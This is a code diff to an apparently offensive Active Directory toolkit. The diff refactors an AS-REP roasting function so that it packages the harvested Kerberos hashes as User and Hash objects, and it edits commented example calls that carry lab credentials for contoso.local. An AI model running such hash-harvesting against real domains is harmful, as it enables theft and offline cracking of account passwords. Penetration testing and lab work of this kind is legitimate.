@@ -1,8 +1,7 @@
 from pympacket.attacks.GetNPUsers import GetUserNoPreAuth
 from argparse import Namespace
 import sys
-import logging
-from pympacket.utils.bruteforce import bruteforce
+from pympacket.models.common import User, Hash
 
 def asreproast(domain, dc_ip, username='', password='', nthash=None, usersfile=None):
     if nthash is not None:
@@ -40,11 +39,18 @@ def asreproast(domain, dc_ip, username='', password='', nthash=None, usersfile=N
     result = []
     if asreps is not None:
         for asrep in asreps:
-            user_result = {}
+            current_user = User()
+            current_hash = Hash()
             user = asrep.split('$')[3].split('@')[0]
-            user_result['username'] = user
-            user_result['asrep'] = asrep
-            result.append(user_result)
+            current_user.username = user
+            current_hash.type = 'asrep'
+            current_hash.value = asrep
+            current_user.krb_hash = current_hash
+            result.append(current_user)
+            #user_result = {}
+            #user_result['username'] = user
+            #user_result['asrep'] = asrep
+            #result.append(user_result)
         return result
     else:
         return None
@@ -53,7 +59,7 @@ def asreproast(domain, dc_ip, username='', password='', nthash=None, usersfile=N
 # [{'username':'svc_sql', 'asrep':'$krb5asrep$...'}]
 
 #asrep_out = asreproast(dc_ip='192.168.56.133', domain='contoso.local', usersfile='SamAccountNames.txt') # Unauth
-#asrep_out = asreproast(dc_ip='192.168.56.133', username='l.douglas', password='Football1', domain='contoso.local') # Auth
+#asrep_out = asreproast(dc_ip='192.168.116.10', username='l.douglas', password='Football1', domain='contoso.local') # Auth
 
 #print(asrep_out)
 #
